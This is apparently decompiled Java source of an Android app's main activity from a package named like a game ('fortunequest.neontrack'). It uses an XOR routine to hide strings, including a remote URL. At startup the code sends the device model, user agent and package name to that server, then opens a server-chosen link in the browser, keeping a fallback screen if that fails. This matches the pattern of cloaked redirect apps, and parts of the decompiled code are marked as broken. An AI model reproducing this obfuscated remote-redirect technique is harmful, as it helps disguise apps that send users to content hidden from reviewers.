package com.fortunequest.neontrack;

import A0.c;
import D1.g;
import D1.j;
import H1.n;
import K.x0;
import K.z0;
import T0.m;
import X0.f;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.fortunequest.neontrack.MainActivity;
import com.fortunequest.neontrack.MainActivity2;
import com.fortunequest.neontrack.R;
import g.AbstractActivityC0128i;
import j1.InterfaceC0170a;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import r1.a;
import r1.d;
import r1.l;
import u0.C0385x;
import v0.e;
import z1.k;
import z1.o;
import z1.p;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0128i {

    /* renamed from: E, reason: collision with root package name */
    public static final /* synthetic */ int f2083E = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f2084A = t(new byte[]{72, 67, -93});

    /* renamed from: B, reason: collision with root package name */
    public final String f2085B = t(new byte[]{89, 80, -74, -23});

    /* renamed from: C, reason: collision with root package name */
    public final f f2086C;

    /* renamed from: D, reason: collision with root package name */
    public final f f2087D;

    /* renamed from: y, reason: collision with root package name */
    public final f f2088y;

    /* renamed from: z, reason: collision with root package name */
    public String f2089z;

    public MainActivity() {
        final int i = 0;
        this.f2088y = new f(new InterfaceC0170a(this) { // from class: t0.t

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f4158b;

            {
                this.f4158b = this;
            }

            @Override // j1.InterfaceC0170a
            public final Object c() {
                MainActivity mainActivity = this.f4158b;
                switch (i) {
                    case 0:
                        int i2 = MainActivity.f2083E;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new v0.e((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    case 1:
                        return mainActivity.getSharedPreferences(mainActivity.f2084A, 0);
                    default:
                        int i3 = MainActivity.f2083E;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
        final int i2 = 1;
        this.f2086C = new f(new InterfaceC0170a(this) { // from class: t0.t

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f4158b;

            {
                this.f4158b = this;
            }

            @Override // j1.InterfaceC0170a
            public final Object c() {
                MainActivity mainActivity = this.f4158b;
                switch (i2) {
                    case 0:
                        int i22 = MainActivity.f2083E;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new v0.e((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    case 1:
                        return mainActivity.getSharedPreferences(mainActivity.f2084A, 0);
                    default:
                        int i3 = MainActivity.f2083E;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
        final int i3 = 2;
        this.f2087D = new f(new InterfaceC0170a(this) { // from class: t0.t

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f4158b;

            {
                this.f4158b = this;
            }

            @Override // j1.InterfaceC0170a
            public final Object c() {
                MainActivity mainActivity = this.f4158b;
                switch (i3) {
                    case 0:
                        int i22 = MainActivity.f2083E;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new v0.e((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    case 1:
                        return mainActivity.getSharedPreferences(mainActivity.f2084A, 0);
                    default:
                        int i32 = MainActivity.f2083E;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
    }

    public static String t(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            int i4 = i3 + 1;
            int i5 = i3 % 4;
            arrayList.add(Byte.valueOf((byte) ((i5 != 0 ? i5 != 1 ? i5 != 2 ? 133 : 196 : 37 : 43) ^ (bArr[i2] & 255))));
            i2++;
            i3 = i4;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, a.f3833a);
    }

    /* JADX WARN: Code restructure failed: missing block: B:22:0x0163, code lost:
    
        r3 = r1;
     */
    @Override // g.AbstractActivityC0128i, a.l, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        u();
        setContentView(((e) this.f2088y.a()).f4460a);
        g gVar2 = null;
        String string = ((SharedPreferences) this.f2086C.a()).getString(this.f2085B, null);
        if (string != null && !d.L(string)) {
            this.f2089z = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{89, 80, -74, -23});
        String t3 = t(new byte[]{20, 68, -76, -11, 22});
        String str = t(new byte[]{67, 81, -80, -11, 88, 31, -21, -86, 82, 64, -88, -23, 68, 82, -23, -15, 89, 80, -80, -19, 6, 20, -10, -75, 27, 11, -93, -13, 71, 83, -78, -26, 64, 78, -85, -88, 66, 87, -74, -4, 69, 70, -81, -18, 74, 28, -9, -85, 92, 74, -74, -18, 78, 87, -73, -85, 79, 64, -78, -86}) + t3 + packageName;
        p pVar = new p(new o());
        m mVar = new m(8);
        k1.e.e(str, "url");
        if (l.C(str, "ws:", true)) {
            String substring = str.substring(3);
            k1.e.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.C(str, "wss:", true)) {
            String substring2 = str.substring(4);
            k1.e.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        k1.e.e(str, "<this>");
        k kVar = new k();
        kVar.c(null, str);
        mVar.f1073a = kVar.a();
        String t4 = t(new byte[]{115, 8, Byte.MIN_VALUE, -32, 93, 76, -89, -32, 6, 104, -85, -31, 78, 73});
        String str2 = Build.MODEL;
        k1.e.d(str2, "MODEL");
        mVar.n(t4, str2);
        mVar.n(t(new byte[]{106, 70, -89, -32, 91, 81, -23, -55, 74, 75, -93, -16, 74, 66, -95}), t(new byte[]{78, 75, -23, -48, 120, 9, -95, -21, 16, 84, -7, -75, 5, 28}));
        String t5 = t(new byte[]{126, 86, -95, -9, 6, 100, -93, -32, 69, 81});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        k1.e.d(defaultUserAgent, "getDefaultUserAgent(...)");
        mVar.n(t5, defaultUserAgent);
        H.e b2 = mVar.b();
        C0385x c0385x = new C0385x(this, 9, t2);
        j jVar = new j(pVar, b2);
        if (!jVar.f181e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f525a;
        jVar.f182f = n.f525a.g();
        m mVar2 = pVar.f4721a;
        g gVar3 = new g(jVar, c0385x);
        mVar2.getClass();
        synchronized (mVar2) {
            ((ArrayDeque) mVar2.f1074b).add(gVar3);
            String str3 = ((z1.l) b2.f483c).d;
            Iterator it = ((ArrayDeque) mVar2.f1075c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (k1.e.a(((z1.l) gVar.f175c.f179b.f483c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) mVar2.f1074b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (k1.e.a(((z1.l) gVar.f175c.f179b.f483c).d, str3)) {
                        }
                    }
                }
            }
            if (gVar2 != null) {
                gVar3.f174b = gVar2.f174b;
            }
        }
        mVar2.v();
    }

    @Override // g.AbstractActivityC0128i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f2089z;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        x0 x0Var;
        WindowInsetsController insetsController;
        H1.d.j0(getWindow(), false);
        Window window = getWindow();
        c cVar = new c(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            z0 z0Var = new z0(insetsController, cVar);
            z0Var.f677f = window;
            x0Var = z0Var;
        } else {
            x0Var = new x0(window, cVar);
        }
        x0Var.L();
        x0Var.p0();
    }

    public final void v() {
        startActivity((Intent) this.f2087D.a());
    }

    public final void w(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
